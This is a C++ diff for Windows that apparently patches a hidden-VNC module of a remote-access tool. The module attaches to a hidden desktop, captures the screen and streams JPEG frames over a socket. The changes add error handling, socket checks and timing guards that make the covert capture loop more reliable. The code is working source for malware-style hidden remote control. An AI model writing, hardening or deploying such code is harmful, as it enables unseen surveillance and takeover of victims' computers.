@@ -79,6 +79,7 @@ static thread g_inputThread;
 static atomic_bool g_inputRunning(false);
 
 static bool safe_send_raw(SOCKET sock, const string& data) {
+    if (sock == INVALID_SOCKET) return false;
     const char* ptr = data.c_str();
     int remaining = (int)data.size();
 
@@ -94,6 +95,7 @@ static bool safe_send_raw(SOCKET sock, const string& data) {
 }
 
 static bool safe_send_json(SOCKET sock, const json& data) {
+    if (sock == INVALID_SOCKET) return false;
     lock_guard<mutex> lock(g_sendMutex);
     string serialized = data.dump(-1, ' ', false, json::error_handler_t::replace);
     return safe_send_raw(sock, serialized + "\r\n");
@@ -104,7 +106,7 @@ static bool safe_send_vnc_frame(SOCKET sock,
                                 int width,
                                 int height,
                                 const vector<unsigned char>& jpegBytes) {
-    if (jpegBytes.empty())
+    if (sock == INVALID_SOCKET || jpegBytes.empty())
         return false;
 
     MonitorFrameHeader frameHeader{};
@@ -313,7 +315,11 @@ static void capture_loop() {
         return;
     }
 
-    SetThreadDesktop(g_hHiddenDesktop);
+    if (!SetThreadDesktop(g_hHiddenDesktop)) {
+        send_vnc_error(g_vncSocket, "Failed to set thread desktop: " + to_string(GetLastError()));
+        g_captureRunning.store(false);
+        return;
+    }
 
     while (g_captureRunning.load()) {
         DWORD frameStart = GetTickCount();
@@ -328,37 +334,56 @@ static void capture_loop() {
             sock = g_vncSocket;
         }
 
+        if (sock == INVALID_SOCKET) {
+            g_captureRunning.store(false);
+            break;
+        }
+
         int width = GetSystemMetrics(SM_CXSCREEN);
         int height = GetSystemMetrics(SM_CYSCREEN);
+
+        if (width <= 0 || height <= 0) {
+            // Might happen if desktop is just created
+            Sleep(100);
+            continue;
+        }
 
         int outWidth = max(1, (width * scale) / 100);
         int outHeight = max(1, (height * scale) / 100);
 
         HDC hdcScreen = GetDC(NULL);
-        HDC hdcMem = CreateCompatibleDC(hdcScreen);
-        HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, outWidth, outHeight);
-        HGDIOBJ old = SelectObject(hdcMem, hbm);
+        if (hdcScreen) {
+            HDC hdcMem = CreateCompatibleDC(hdcScreen);
+            if (hdcMem) {
+                HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, outWidth, outHeight);
+                if (hbm) {
+                    HGDIOBJ old = SelectObject(hdcMem, hbm);
 
-        SetStretchBltMode(hdcMem, HALFTONE);
-        StretchBlt(hdcMem, 0, 0, outWidth, outHeight, hdcScreen, 0, 0, width, height, SRCCOPY);
+                    SetStretchBltMode(hdcMem, HALFTONE);
+                    if (StretchBlt(hdcMem, 0, 0, outWidth, outHeight, hdcScreen, 0, 0, width, height, SRCCOPY)) {
+                        SelectObject(hdcMem, old);
 
-        SelectObject(hdcMem, old);
-
-        vector<unsigned char> jpegBytes;
-        string error;
-        if (bitmap_to_jpeg(hbm, (ULONG)quality, jpegBytes, error)) {
-            if (!safe_send_vnc_frame(sock, scale, outWidth, outHeight, jpegBytes)) {
-                g_captureRunning.store(false);
+                        vector<unsigned char> jpegBytes;
+                        string error;
+                        if (bitmap_to_jpeg(hbm, (ULONG)quality, jpegBytes, error)) {
+                            if (!safe_send_vnc_frame(sock, scale, outWidth, outHeight, jpegBytes)) {
+                                g_captureRunning.store(false);
+                            }
+                        }
+                    } else {
+                        SelectObject(hdcMem, old);
+                    }
+                    DeleteObject(hbm);
+                }
+                DeleteDC(hdcMem);
             }
+            ReleaseDC(NULL, hdcScreen);
         }
 
-        DeleteObject(hbm);
-        DeleteDC(hdcMem);
-        ReleaseDC(NULL, hdcScreen);
-
         DWORD elapsed = GetTickCount() - frameStart;
-        DWORD interval = 1000 / g_targetFps;
+        DWORD interval = 1000 / max(1, g_targetFps);
         if (elapsed < interval) Sleep(interval - elapsed);
+        else Sleep(1);
     }
 }
 
